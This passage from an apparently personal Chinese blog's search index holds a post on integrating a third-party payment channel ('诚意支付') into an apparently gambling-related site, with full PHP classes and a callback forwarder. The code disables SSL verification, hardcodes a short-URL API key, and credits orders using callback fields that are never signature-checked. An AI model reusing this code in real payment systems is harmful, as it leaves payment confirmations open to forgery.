CURLOPT_POSTFIELDS, http_build_query($payData));\n    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);\n\n    $response=curl_exec($ch);\n    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);\n\n    curl_close($ch);\n    if ($httpCode == 200) {\n        return $response;\n    } else {\n        return 0;\n    }\n}\n\n/**\n * 支付日志\n * @param  string $fileName 文件名,如：payerror.log或者pay/error.log\n * @param  array $data 数据\n */\nfunction payLog($fileName, $data)\n{\n    $pathLog = S_ROOT . 'caches' . DIRECTORY_SEPARATOR . 'log' . DIRECTORY_SEPARATOR . $fileName;\n    if (is_file($pathLog)) {\n        if (filesize($pathLog) >= 10000000) {\n            $new_file = dirname($pathLog) . '/' . date('Y_m_d_H_i_s').'_'  . basename($pathLog);\n            copy($pathLog,$new_file);\n            file_put_contents($pathLog, '<----' . date('Y-m-d H:i:s').'---->' . $data . \"\\n\");\n        }else {\n            file_put_contents($pathLog, '<----' . date('Y-m-d H:i:s').'---->' . $data . \"\\n\", FILE_APPEND);\n        }\n    }else {\n        file_put_contents($pathLog, '<----' . date('Y-m-d H:i:s').'---->' . $data . \"\\n\", FILE_APPEND);\n    }\n}\n```","source":"_posts/2019/6/乐购菠菜添加支付方式.md","raw":"---\nlayout: post\ntitle: 乐购菠菜添加支付方式\ntags:\n  - php\ncategories:\n  - php\npassword: Legou\nabbrlink: 25578\ndate: 2019-05-31 20:42:56\n---\n\n### 前言\n\n突然有一天老板扔给我一个错误百出的文档（文档不规范，码农两行泪），让我往某不知名网站添加某不可描述支付\n\n<!--more-->\n\n### 分析\n\n- 登录后台发现有添加第三方支付的菜单，但是发现只能更改配置，无法添加新的支付方式（知道不会这么简单）\n\n- 进入数据库发现数据存储在`payment_config`表中，试着直接数据库添加查看数据变化，添加后发现只能出现在支付列表中，无法添加和更改配置\n\n- 查看页面请求，直接阅读获取支付代码，发现有一个`pay.json`的配置文件，直接打开，部分代码如下\n\n```json\n[\n    {\n        \"nid\": \"nid_pay\",\n        \"name\": \"请选择类型\",\n        \"merchantID\": \"支付平台提供给商家的账号\",\n        \"terminalID\": \"支付平台提供给商家的终端号\",\n        \"merchantKey\": \"支付平台提供个商家的密码（MD5加密时使用）\",\n        \"merchantPayKey\": \"支付有关的其他秘钥或信息\",\n        \"partnerId\": \"支付平台代理商账号\",\n        \"merchantPrivateKey\": \"用户私钥（与用户公钥成对存在）\",\n        \"merchantPublicKey\": \"用户公钥（与用户私钥成对存在）\",\n        \"platformPublicKey\": \"平台公钥（平台提供，一般在商户登录支付平台后台管理页面获取）\",\n        \"merchantCertPath\": \"商家证书\",\n        \"platformCertPath\": \"平台证书\",\n        \"payBank\": [{\"bank_id\":1,\"code\":\"ICBC\"},{\"bank_id\":2,\"code\":\"ABC\"},{\"bank_id\":9,\"code\":\"BOC\"},{\"bank_id\":7,\"code\":\"CCB\"},\n        \t\t\t{\"bank_id\":10,\"code\":\"COMM\"},{\"bank_id\":11,\"code\":\"CMB\"},{\"bank_id\":14,\"code\":\"SPDB\"},{\"bank_id\":26,\"code\":\"CIB\"},\n        \t\t\t{\"bank_id\":15,\"code\":\"CMBC\"},{\"bank_id\":13,\"code\":\"GDB\"},{\"bank_id\":12,\"code\":\"SPDB\"},{\"bank_id\":8,\"code\":\"CEB\"},\n        \t\t\t{\"bank_id\":29,\"code\":\"HXB\"},{\"bank_id\":3,\"code\":\"PSBC\"},{\"bank_id\":6,\"code\":\"PAB\"}\n    \t\t\t],\n        \"pay_layers\": \"1,2,3,5,4,6,7,8,9,10,11\",\n        \"payType\": [\n\t        {\"id\": 1,\"name\":\"微信扫码支付\",\"payStr\":\"支付配置信息\",\"typeStr\":\"其他支付配置信息\",\"payEntrance\":\"端口类型：1=ios,2=android,3=h5,4=pc\",\"payStatus\":\"是否启用：1:启用;2:禁用\",\"request_type\":\"返回数据or跳转页面：1：返回数据，2:跳转页面\"},\n\t        {\"id\": 2,\"name\":\"微信WAP支付\",\"payStr\":\"WX_WAP\",\"typeStr\":\"\",\"payEntrance\":\"1,2,3,4\",\"payStatus\":1,\"request_type\":2},\n\t        {\"id\": 3,\"name\":\"微信H5支付\",\"payStr\":\"WX_H5\",\"typeStr\":\"\",\"payEntrance\":\"1,2,3,4\",\"payStatus\":1,\"request_type\":2},\n\t        {\"id\": 4,\"name\":\"支付宝扫码支付\",\"payStr\":\"ALI\",\"typeStr\":\"\",\"payEntrance\":\"1,2,3,4\",\"payStatus\":1,\"request_type\":1},\n\t        {\"id\": 5,\"name\":\"支付宝WAP支付\",\"payStr\":\"ALI_WAP\",\"typeStr\":\"\",\"payEntrance\":\"1,2,3,4\",\"payStatus\":1,\"request_type\":2},\n\t        {\"id\": 6,\"name\":\"支付宝H5支付\",\"payStr\":\"ALI_H5\",\"typeStr\":\"\",\"payEntrance\":\"1,2,3,4\",\"payStatus\":1,\"request_type\":2},\n\t        {\"id\": 7,\"name\":\"QQ钱包扫码支付\",\"payStr\":\"QQ\",\"typeStr\":\"\",\"payEntrance\":\"1,2,3,4\",\"payStatus\":1,\"request_type\":1},\n\t        {\"id\": 8,\"name\":\"QQ钱包WAP支付\",\"payStr\":\"QQ_WAP\",\"typeStr\":\"\",\"payEntrance\":\"1,2,3,4\",\"payStatus\":1,\"request_type\":2},\n\t        {\"id\": 9,\"name\":\"QQ钱包H5支付\",\"payStr\":\"QQ_H5\",\"typeStr\":\"\",\"payEntrance\":\"1,2,3,4\",\"payStatus\":1,\"request_type\":2},\n\t        {\"id\": 10,\"name\":\"网银支付\",\"payStr\":\"WY\",\"typeStr\":\"\",\"payEntrance\":\"1,2,3,4\",\"payStatus\":1,\"request_type\":2},\n\t        {\"id\": 11,\"name\":\"网银H5支付\",\"payStr\":\"WY_H5\",\"typeStr\":\"\",\"payEntrance\":\"1,2,3,4\",\"payStatus\":1,\"request_type\":2},\n\t        {\"id\": 12,\"name\":\"网银快捷支付\",\"payStr\":\"WY_KJ\",\"typeStr\":\"\",\"payEntrance\":\"1,2,3,4\",\"payStatus\":1,\"request_type\":2},\n        \t{\"id\": 13,\"name\":\"京东钱包扫码支付\",\"payStr\":\"JD\",\"typeStr\":\"\",\"payEntrance\":\"1,2,3,4\",\"payStatus\":1,\"request_type\":1},\n\t        {\"id\": 14,\"name\":\"京东钱包WAP支付\",\"payStr\":\"JD_WAP\",\"typeStr\":\"\",\"payEntrance\":\"1,2,3,4\",\"payStatus\":1,\"request_type\":2},\n\t        {\"id\": 15,\"name\":\"京东钱包H5支付\",\"payStr\":\"JD_H5\",\"typeStr\":\"\",\"payEntrance\":\"1,2,3,4\",\"payStatus\":1,\"request_type\":2},\n\t        {\"id\": 16,\"name\":\"银联钱包扫码支付\",\"payStr\":\"UN\",\"typeStr\":\"\",\"payEntrance\":\"1,2,3,4\",\"payStatus\":1,\"request_type\":1},\n\t        {\"id\": 17,\"name\":\"银联钱包WAP支付\",\"payStr\":\"UN_WAP\",\"typeStr\":\"\",\"payEntrance\":\"1,2,3,4\",\"payStatus\":1,\"request_type\":2},\n\t        {\"id\": 18,\"name\":\"银联钱包H5支付\",\"payStr\":\"UN_H5\",\"typeStr\":\"\",\"payEntrance\":\"1,2,3,4\",\"payStatus\":1,\"request_type\":2},\n          {\"id\": 19,\"name\":\"网关支付扫码\",\"payStr\":\"gateway\",\"typeStr\":\"\",\"payEntrance\":\"1,2,3,4\",\"payStatus\":1,\"request_type\":2},\n          {\"id\": 20,\"name\":\"微信公众账号\",\"payStr\":\"weixinjsapi\",\"typeStr\":\"\",\"payEntrance\":\"1,2,3,4\",\"payStatus\":1,\"request_type\":1},\n          {\"id\": 21,\"name\":\"支付宝服务窗支付\",\"payStr\":\"weixinjsapi\",\"typeStr\":\"\",\"payEntrance\":\"1,2,3,4\",\"payStatus\":1,\"request_type\":1},\n          {\"id\": 22,\"name\":\"支付宝app支付\",\"payStr\":\"alipayapp\",\"typeStr\":\"\",\"payEntrance\":\"1,2,3,4\",\"payStatus\":1,\"request_type\":1},\n          {\"id\": 23,\"name\":\"苏宁扫码支付\",\"payStr\":\"suning\",\"typeStr\":\"\",\"payEntrance\":\"1,2,3,4\",\"payStatus\":1,\"request_type\":1}\n\t        ],\n        \"sort\": 0\n    },\n    {\n        \"nid\": \"hua_yin_pay\",\n        \"name\": \"华银\",\n        \"merchantID\": \"\",\n        \"merchantPrivateKey\": \"\",\n        \"merchantPublicKey\": \"\",\n        \"platformPublicKey\": \"\",\n        \"payType\": [\n        \t{\"id\": 1,\"name\":\"微信扫码支付\",\"payStr\":\"weixin_scan\",\"payEntrance\":\"1,2,3,4\",\"payStatus\":1,\"request_type\":1},\n        \t{\"id\": 4,\"name\":\"支付宝扫码支付\",\"payStr\":\"alipay_scan\",\"payEntrance\":\"1,2,3,4\",\"payStatus\":1,\"request_type\":1},\n        \t{\"id\": 7,\"name\":\"QQ钱包宝扫码支付\",\"payStr\":\"tenpay_scan\",\"payEntrance\":\"1,2,3,4\",\"payStatus\":1,\"request_type\":1},\n        \t{\"id\": 10,\"name\":\"网银支付\",\"payStr\":\"direct_pay\",\"payEntrance\":\"1,2,3,4\",\"payStatus\":1,\"request_type\":2}\n        ]\n    },\n]\n```\n\n思路已经清晰了，直接从文件中添加了一个新的支付配置，果然后台支付列表中出现了，添加上该支付的配置参数\n\n- 添加后，发起支付，报无此支付方式的错误，直接在代码中搜索这个错误信息，找到这个`PayFactory.php`工厂类，部分代码如下\n\n```php\n<?php\n\n/**\n * Created by Kevin.\n * @author kevin\n * @copyright HCHT 2017/9/15 17:06\n * @description 支付工厂类\n */\n\ninclude_cache(S_CORE . 'class' . DS . 'pay'  . DS . 'chengyi.php');\n\nclass PayFactory\n{\n\tpublic function getInterface($payMent)\n\t{\n        switch ($payMent) {\n            case 'cheng_yi_pay':\n                return new cheng_yi_pay();\n                break;\n            default:\n                ErrorCode::errorResponse(200015, '线上支付方式不存在');\n        }\n\t}\n}\n```\n\n思路已经很明朗了，创建一个支付类，添加上case分支\n\n- 随便打开一个支付类，根据它的部分逻辑，接入新的支付逻辑，处理异步回调时，发现有两个回调可供选择，一个在`recharge.php`中，一个在根目录下的`rechargeNotify.php`中，同步回调在根目录下`beeePayOk.php`，具体可阅读代码，没有必要张贴\n\n### 实现\n具体的支付类代码，仅供参考，每个支付的具体实现都有差别\n\n```php\n\n\n<?php\n\n/**\n * @description 诚意支付\n */\n\ninclude_cache(S_CORE . 'class' . DS . 'pay' . DS . 'payinfo' . '.php');\n\nclass ChengYiPay extends PayInfo\n{\n    //请求接口Url\n    public $url      = 'https://pay.chenyipay.com/api/pay/v2';\n    //接口名称\n    public $payName  = '诚意支付';\n\n    //获取支付返回数据格式\n    public $retArr = [               //支付信息返回格式\n            'code' => 1,             //0:数据获取成功，其他数字，数据获取失败\n            'msg' => '',             //返回的提示信息\n            'data' => []             //返回数据\n        ];\n\n    //回调处理返回数据格式\n    public $orderInfo = [            //异步验签结果返回格式\n        'code' => 0,                 //0：数据获取成功，其他数字，数据获取失败\n        'bank_num' => 219050,        //银行区分号（不同支付的前三位不同）\n        'order_no' => '',            //后台数据库支付订单号\n        'amount' => 0,               //支付金额\n        'ret_error' => 0,            //回调处理失败时，返回接口字符串\n        'ret_success' => 'ok',        //回调处理成功时，返回接口字符串\n        'bank_name' => '诚意支付',     //支付方式名称\n        'serial_no' => ''            //第三方回调返回的第三方支付订单号（支付流水号）\n    ];\n\n    /**\n     * 构成函数\n     */\n    public function __construct()\n    {\n        parent::__construct();\n    }\n\n    /**\n     * 调用第三方支付接口，获取支付信息\n     * @param array $data 前端返回信息，payment_id，支付类型ID，config，支付类型配置信息\n     * {@inheritDoc}\n     * @see PayInfo::doPay()\n     * @return $this->$retArr;\n     */\n    public function doPay($data)\n    {\n        //生成订单\n        $orderInfo = $this->makeOrder($data);\n        if (!$orderInfo) {\n            $this->retArr['code'] = 219000;\n            $this->retArr['msg']  = '支付订单生成失败';\n            payLog('payerror.log', '（' . $this->retArr['code'] . '）' . $this->payName . '订单生成失败，' . print_r($data, true));\n\n            return $this->retArr;\n        }\n\n        //获取配置支付信息\n        $config      = unserialize($data['config']);\n        $callbackurl = $config['callbackurl']?$config['callbackurl']:$_SERVER['HTTP_HOST'];\n\n        if (empty($data['pay_type']) || empty($config['payType'][$data['pay_type']])) {\n            $this->retArr['code'] = 219001;\n            $this->retArr['msg']  = '支付银行类型不存在';\n            payLog('payerror.log', '（' . $this->retArr['code'] . '）' . $this->payName . '银行类型不存在，' . print_r($data, true));\n\n            return $this->retArr;\n        }\n\n        $postData = [\n            'p1_mchtid'   => $config['merchantID'],\n            'p2_paytype'  => $config['payType'][$data['pay_type']]['payStr'],\n            'p3_paymoney' => $data['money'],\n            'p4_orderno'  => $orderInfo,\n            //异步\n            'p5_callbackurl' => \"http://\".$callbackurl.\"/?m=api&c=recharge&a=rechargeNotify&payment_id=\" . $data['payment_id'],\n            //同步\n            'p6_notifyurl' => \"http://\".$callbackurl.\"/beeePayOk.php\",\n            'p7_version'   => 'v2.9',\n            'p8_signtype'  => '2',\n            'p9_attach'    => 'chengyi_' . $data['payment_id'],\n            'p10_appname'  => '',\n            'p11_isshow'   => '0',\n            'p12_orderip'  => ip(),\n            'p13_memberid' => $data['user_id'],\n        ];\n\n        payLog('chengyi.txt',print_r($postData,true));\n\n        //待签名字符串\n        $signStr   = $this->get_sign($postData);\n        //生成签名\n        $postData[\"sign\"] = md5($signStr.$config['merchantKey']);\n        //转为json字符串\n        $jsonStr   = json_encode($postData);\n        //获取公钥\n        $publicKey = $this->publicKeyStr($config['merchantPublicKey']);\n        //公钥加密\n        $reqdata   = urlencode($this->publicEncrypt($publicKey, $jsonStr));\n        //请求参数\n        $signData[\"mchtid\"]  = $config['merchantID'];\n        $signData[\"reqdata\"] = $reqdata;\n\n        //判断支付网关是否是wap\n        if ($config['payType'][$data['pay_type']]['request_type'] == 2) {\n            $retData =  [\n                'type'  => $config['payType'][$data['pay_type']]['request_type'],\n                'modes' => $data['pay_model'],\n                'html'  => $this->paramToHtmlForm($this->url, $signData)\n            ];\n\n            $this->retArr['code'] = 0;\n            $this->retArr['data']  = $retData;\n\n            return $this->retArr;\n        }\n\n        //发起请求\n        $result = $this->httpRequest($this->url, json_encode($signData));\n        //将json字符串转为数组\n        $resultArr = json_decode($result,true);\n        //判断返回信息\n        if ($resultArr['rspCode'] != 1 && !$resultArr['data']) {\n            $this->retArr['code'] = 219002;\n            $this->retArr['msg']  = '支付二维码生成失败！';\n            payLog('payerror.log', '（' . $this->retArr['code'] . '）' . $this->payName . $resultArr[\"rspMsg\"] . print_r($resultArr, true));\n\n            return $this->retArr;\n        }\n\n        $resultData = $resultArr['data'];\n        //验签\n        $re = $this->payVerify($resultData, $config['merchantKey']);\n\n        if (!$re) {\n            $this->retArr['code'] = 219003;\n            $this->retArr['msg']  = '支付二维码生成失败！';\n\n            payLog('payerror.log', '（' . $this->retArr['code'] . '）' . $this->payName . '验签失败' . print_r($resultArr, true));\n\n            return $this->retArr;\n        }\n\n        payLog('chengyi.txt',print_r($resultData, true). \"===134\");\n\n\n        $retOderNo           = $orderInfo;\n        $retOderPayNo        = isset($resultData['r2_systemorderno']) ? $resultData['r2_systemorderno'] : 'chengyipay' . date('YmdHis');\n        $retOderPayQrcodrUrl = isset($resultData['r6_qrcode']) ? $resultData['r6_qrcode'] : '';\n\n        $result = D('accountRecharge')->getOneCoupon('id', array('order_sn' => $retOderNo, 'status' => 0));\n\n        if (empty($result)) {\n            $this->retArr['code'] = 219004;\n            $this->retArr['msg']  = '支付二维码生成失败！';\n            payLog('payerror.log', '（' . $this->retArr['code'] . '）' . $this->payName . '返回数据成功,但订单表没有查到相应未完成的订单号，' . print_r($resultArr, true));\n\n            return $this->retArr;\n        }\n\n        D('accountRecharge')->save(['remark' => $retOderPayNo], ['order_sn' => $retOderNo]);\n\n        // 用于安全验证返回url是否非法\n        $shortQrcodrUrl =$this->shortUrl($retOderPayQrcodrUrl, '5cf1028991d2c405942b1569@f15436319999938d84e5f8b7d25e9dda');\n        if (!$shortQrcodrUrl) {\n            $this->retArr['code'] = 219005;\n            $this->retArr['msg']  = '支付二维码生成失败！';\n            payLog('payerror.log', '（' . $this->retArr['code'] . '）' . $this->payName . '二维码获取成功，但转换短链接失败' . print_r($resultArr, true));\n\n            return $this->retArr;\n        }\n\n        session::set('qrcode_url', $shortQrcodrUrl);\n        session::set('pay_url', '');\n\n        //type =1 返回二维码数据\n        $ret =  [\n            'type'     => $config['payType'][$data['pay_type']]['request_type'],\n            'code_url' => $shortQrcodrUrl,\n            'pay_url'  => '',\n            'order_no' => $orderInfo,\n            'modes'    => $data['pay_model']\n        ];\n\n        $this->retArr['code'] = 0;\n        $this->retArr['data'] = $ret;\n\n        return $this->retArr;\n    }\n\n    /**\n     * 支付回调处理\n     * @param array $postData data：回调返回的数据，payment_Id：支付类型ID\n     * {@inheritDoc}\n     * @see PayInfo::doPaycallBack()\n     * @return array $this->$retArr;\n     */\n    public function doPaycallBack($postData)\n    {\n        //接收回调后 返回 ok;\n        echo 'ok';\n\n        //处理post回调数据\n        $data       = json_decode($postData['data'], true);\n        $reqdata    = $data['reqdata'];\n        $config     = unserialize($postData['config']);\n\n        payLog('chengyi.txt',print_r($postData, true).'----996--');\n\n        //判断字符串是否需要 urldecode解\n        if (strpos($reqdata, '%')) {\n            $reqdata =  urldecode($reqdata);\n        }\n\n        if (!is_array($config)) {\n            $this->orderInfo['code'] = 219020;\n            payLog('payerror.log', '（' . $this->orderInfo['code'] . '）支付异步通知,获取数据库配置错误！'  . print_r($data, true));\n\n            return $this->orderInfo;\n        }\n\n        if (!$reqdata) {\n            $this->orderInfo['code'] = 219021;\n            payLog('payerror.log', '（' . $this->orderInfo['code'] . '）支付异步通知:获取重要参数错误！'  . print_r($data, true));\n\n            return $this->orderInfo;\n        }\n\n        //获取私钥\n        $private_key = $this->privateKeyStr($config['merchantPrivateKey']);\n        //解密\n        $dataJson    = $this->privateDecrypt($reqdata, $private_key);\n\n        if (!$dataJson) {\n            $this->orderInfo['code'] = 219022;\n            payLog('payerror.log', '（' . $this->orderInfo['code'] . '）支付异步通知：支付解密失败！'  . print_r($data, true));\n\n            return $this->orderInfo;\n        }\n\n        $arr = json_decode($dataJson, true);\n        $arr['partner'] = $config['merchantID'];\n\n        //去除不需要参入验签的字段\n        unset($arr[\"sysnumber\"]);\n        unset($arr[\"attach\"]);\n\n        //验证签名\n        $re = $this->payVerify($arr, $config['merchantKey']);\n\n        if (!$re) {\n            $this->orderInfo['code'] = 219023;\n            payLog('payerror.log', '（' . $this->orderInfo['code'] . '）支付异步通知：验签失败！'  . print_r($arr, true));\n\n            return $this->orderInfo;\n        }\n\n        if (!isset($arr['orderstatus']) || $arr['orderstatus'] != 1 ) {\n            $this->orderInfo['code'] = 219024;\n            payLog('payerror.log', '（' . $this->orderInfo['code'] . '）支付异步通知：支付失败！'  . print_r($data, true));\n\n            return $this->orderInfo;\n        }\n\n        $this->orderInfo['code']  = 0;\n        $this->orderInfo['order_no']  = $data['ordernumber'];\n        $this->orderInfo['amount']    = $data['paymoney'];\n        $this->orderInfo['serial_no'] = $data['sysnumber'];\n\n        return $this->orderInfo;\n    }\n\n\n    /**\n     * [get_sign 拼接签名字符串]\n     * @param  [type] $arr 数组\n     * @return [type]      [description]\n     */\n    public  function get_sign($arr)\n    {\n\t\t$signmd5=\"\";\n\t\tforeach($arr as $x=>$x_value)\n\t\t{\n\t\t\tif($signmd5==\"\"){\n\t\t\t\t$signmd5 =$signmd5.$x .'='. $x_value;\n\t\t\t}else{\n\t\t\t\t$signmd5 = $signmd5.'&'.$x .'='. $x_value;\n\t\t\t}\n\n\t\t}\n\t\treturn $signmd5;\n    }\n\n    /**\n     * [publicKeyStr 公钥字符串处理]\n     * @param  [type] $publicStr 公钥字符串\n     * @return [type]            [description]\n     */\n    public   function publicKeyStr($publicStr)\n    {\n        $public_key = \"-----BEGIN PUBLIC KEY-----\\r\\n\";\n        foreach (str_split($publicStr,64) as $str){\n            $public_key .= $str . \"\\r\\n\";\n        }\n        $public_key .=\"-----END PUBLIC KEY-----\";\n\n        return $public_key;\n    }\n\n    /**\n      * [publicEncrypt 公钥加密]\n      * @param  [type] $publicKey 公钥\n      * @param  [type] $data      加密字符串\n      * @return [type]            [description]\n      */\n      public  function publicEncrypt($publicKey, $data)\n      {\n        $key = openssl_get_publickey($publicKey);\n\n        $original_arr = str_split($data,117);\n        foreach($original_arr as $o) {\n            $sub_enc = null;\n            openssl_public_encrypt($o,$sub_enc,$key);\n            $original_enc_arr[] = $sub_enc;\n        }\n\n        openssl_free_key($key);\n        $original_enc_str = base64_encode(implode('',$original_enc_arr));\n\n        return $original_enc_str;\n    }\n\n    /**\n     * [paramToHtmlForm form表单方法]\n     * @param  [type] $url    请求URL\n     * @param  [type] $params 数组 请求参数\n     * @return [type]         [description]\n     */\n    public  function paramToHtmlForm($url,$params)\n    {\n        $def_url = \"<form id='form' name='payForm' action='\".$url.\"' method='POST'>\\r\";\n        foreach ($params as $key => $value) {\n            $def_url .=\"<input type='hidden' name='\".$key.\"' value='\".$value.\"'>\\r\";\n        }\n        $def_url .=\"<input type='submit' value='确认提交'></form><script language='javascript'>window.onload=function(){document.payForm.submit();}</script>\";\n\n        return $def_url;\n    }\n\n    /**\n     * [httpRequest http请求]\n     * @param  [type] $url  请求URL\n     * @param  [type] $data 请求参数 json字符串\n     * @return [type]       [description]\n     */\n    public  function httpRequest($url,$data)\n    {\n        $ch = curl_init();\n        curl_setopt($ch, CURLOPT_URL, $url);\n        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, \"POST\");\n        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);\n        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);\n        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; MSIE 5.01; Windows NT 5.0)');\n        curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json','Content-Length: ' . strlen($data)));\n        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);\n        curl_setopt($ch, CURLOPT_AUTOREFERER, 1);\n        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);\n        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);\n        $tmpInfo = curl_exec($ch);\n        if (curl_errno($ch)) {\n            return curl_error($ch);\n        }\n\n        return $tmpInfo;\n    }\n\n    /**\n     *[payVerify 支付付验签]\n     * @param  [type] $result [返回的参数]\n     * @return [type] $md5    [MD5]\n     */\n\n    public function payVerify($result,$md5)\n    {\n        $signStr = $result['sign'];\n        $sign_array = array();\n        foreach ($result as $k => $v) {\n            if ($k !== 'sign'){\n                $sign_array[$k] = $v;\n            }\n        }\n        $sign  = md5($this->get_sign($sign_array).$md5);\n        if($signStr != $sign){\n            return false;\n        }\n\n        return true;\n    }\n\n    function CurlQuery($url)\n    {\n        //设置附加HTTP头\n        $addHead = array(\n            \"Content-type: application/json\"\n        );\n        $curl_obj = curl_init();\n        curl_setopt($curl_obj, CURLOPT_URL, $url);\n        curl_setopt($curl_obj, CURLOPT_HTTPHEADER, $addHead);\n        curl_setopt($curl_obj, CURLOPT_HEADER, 0);\n        curl_setopt($curl_obj, CURLOPT_RETURNTRANSFER, 1);\n        curl_setopt($curl_obj, CURLOPT_TIMEOUT, 15);\n        $result = curl_exec($curl_obj);\n        curl_close($curl_obj);\n\n        return $result;\n  }\n\n    //根据长网址获取短网址\n    function shortUrl($long_url, $appkey)\n    {\n        $long_url = urlencode($long_url);\n        $url = 'http://mrw.so/api.php?format=json&url=' . $long_url . '&key=' . $appkey . '&expireDate=' . date(\"Y-m-d\",strtotime(\"+3 day\"));\n\n        //获取请求结果\n        $result = $this->CurlQuery($url);\n        $json = json_decode($result);\n        //异常情况返回false\n        if ($json->err) {\n            return false;\n        }\n\n        return $json->url;\n    }\n\n     /**\n     * 提交表单数据\n     * @param array $post_data 表单提交数据\n     * @param string $url 表单提交接口\n     * @return string\n     */\n    function httpHtml($post_data, $url)\n    {\n        $html = '<html>';\n        $html = '<head>';\n        $html .= '<meta http-equiv=\"Content-Type\" content=\"text/html; charset=gb2312\">';\n        $html .= '</head>';\n        $html .= '<body onLoad=\"document.dinpayForm.submit();\">';\n        $html .= '<form id=\"payFrom\" name=\"dinpayForm\" method=\"get\" action=\"' . $url . '\">';\n        foreach ($post_data as $key => $value) {\n            $html .= '<input type=\"hidden\" name=\"' . $key . '\" value=\"' . $value . '\"/>';\n        }\n        $html .= '</form>';\n        $html .= '</body>';\n        $html .= '</html>';\n        return $html;\n    }\n\n     /**\n     * 调用第三方接口，提交数据\n     * @param string $url 第三方接口url\n     * @param array $postdata 提交数据\n     * @return array[]|mixed[] 返回数据\n     */\n    public function httpPost($data, $url, $path='')\n    {\n        $ch = curl_init();\n        curl_setopt($ch, CURLOPT_POST, 1);\n        curl_setopt($ch, CURLOPT_URL, $url);\n        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);\n        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\n        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);\n        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);\n        curl_setopt($ch, CURLOPT_CAINFO, $path);\n        curl_setopt($ch, CURLOPT_HEADER, 0);\n        curl_setopt($ch, CURLOPT_HTTPHEADER,array('Content-Type: application/json; charset=utf-8','Content-Length:' . strlen($data)));\n        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);\n\n        $response = curl_exec($ch);\n        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);\n        return array('code' => $httpCode, 'data' => $response);\n    }\n\n    /**\n     * [privateKeyStr 私钥钥字符串处理]\n     * @param  [type] $privatekey [description]\n     * @return [type]             [description]\n     */\n    public function privateKeyStr($privatekey)\n    {\n        $private_key = \"-----BEGIN PRIVATE KEY-----\\r\\n\";\n        foreach (str_split($privatekey,64) as $str){\n            $private_key .= $str . \"\\r\\n\";\n        }\n        $private_key .=\"-----END PRIVATE KEY-----\";\n\n        return $private_key;\n    }\n\n    /**\n     * [decode 私钥解密]\n     * @param  [type] $data       [待解密字符串]\n     * @param  [type] $privateKey [私钥]\n     * @return [type]             [description]\n     */\n    public function privateDecrypt($data,$privateKey)\n    {\n        //读取秘钥\n        $pr_key = openssl_pkey_get_private($privateKey);\n        if ($pr_key == false){\n            echo \"打开密钥出错\";\n            die;\n        }\n        $data = base64_decode($data);\n        $crypto = '';\n        //分段解密\n        foreach (str_split($data, 128) as $chunk) {\n            openssl_private_decrypt($chunk, $decryptData, $pr_key);\n            $crypto .= $decryptData;\n        }\n\n        return $crypto;\n    }\n\n}\n```\n\n- rechargeNotify回调核心代码\n\n```php\n\n<?php\n/**\n * desc: 处理线上支付无参数路由支付回调处理方法：通过url调用执行该文件，获取相关支付确认信息后，通过curl转发到带参数路由的api接口\n */\ndefine('S_ROOT', dirname(__FILE__) . DIRECTORY_SEPARATOR);\n//require S_ROOT . 'core' . DIRECTORY_SEPARATOR . 'base.php';\n\n$data       = [];  //支付回调数据\n$payData    = '';  //支付回传的支付参数，规定：使用\"_\"将支付名称与支付ID连接起来，如兄弟支付：'xiongdi_123'\n$payType    = '';  //支付类型\n$payment_id = '';  //支付方式ID\n\n//不同的支付方式获取数据的方式可能不同，根据不同的支付，添加不同的获取回调数据的方法，如：$_GET\\$_POST\\$_REQUEST\\（php://input）\n$postData = file_get_contents(\"php://input\");  //获取post参数字符串类型数据\npayLog('callbackRecharge.txt',print_r($postData,true).'---23---');\n\n//数据处理，不同的支付方式，可能数据处理方式不同\nif  (!empty($postData)) {\n    if (!simplexml_load_string($postData, 'SimpleXMLElement', LIBXML_NOCDATA)) {\n       parse_str($postData, $data);\n    } else {\n        $data = json_decode(json_encode(simplexml_load_string($postData, 'SimpleXMLElement', LIBXML_NOCDATA)), true);\n    }\n    payLog('callbackRecharge.txt',print_r($postData,true).'---20---' . print_r(simplexml_load_string($postData, 'SimpleXMLElement', LIBXML_NOCDATA),true));\n} else {\n    $data = $_REQUEST;\n}\n\npayLog('callbackRecharge.txt',print_r($data,true).'---26---');\n\nif (!empty($data)) {\n    payLog('callbackRecharge.txt', '异步充值接参数通知数据：' . print_r($data, true));  //日志，记录转接数据\n\n    if (isset($data['pay_attach'])) {\n        $payData = explode('_', $data['pay_attach']);\n    }\n\n    if (empty($payData)) {\n        exit('0');\n    }\n\n    $payType    = $payData[0] ?? '';\n    $payment_id = $payData[1] ?? '';\n}\n\n\nif (!empty($data) && !empty($payment_id)) {\n\n    payLog('curlRecharge.log', '异步充值url转接参数通知数据：' . print_r($data, true));  //日志，记录转接数据\n\n    $ret = httpPostApi($data, $payment_id);   //异步充值通知转接\n    payLog('callbackRecharge.txt',print_r($ret,true).'----73--');\n\n    echo $ret;  //输出结果数据\n}\n\n\n/**\n * 充值异步转接接口调用，post数据转发，表单提交数据库格式\n * @param array $payData  需要转发的数据\n * @param int $paymentId  线上支付方式ID\n * @return mixed|number   返回数据\n */\nfunction httpPostApi($payData, $paymentId)\n{\n    //路由api接口\n    $payUrl = \"https://\".$_SERVER['HTTP_HOST'].\"/?m=api&c=recharge&a=rechargeNotify&payment_id=\" . $paymentId;\n\n    $ch = curl_init();\n    curl_setopt($ch,CURLOPT_URL, $payUrl);\n    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);\n    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);\n    curl_setopt($ch, CURLOPT_POST, true);\n    curl_setopt($ch, CURLOPT_HEADER, false);\n    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($payData));\n    curl_setopt($ch, 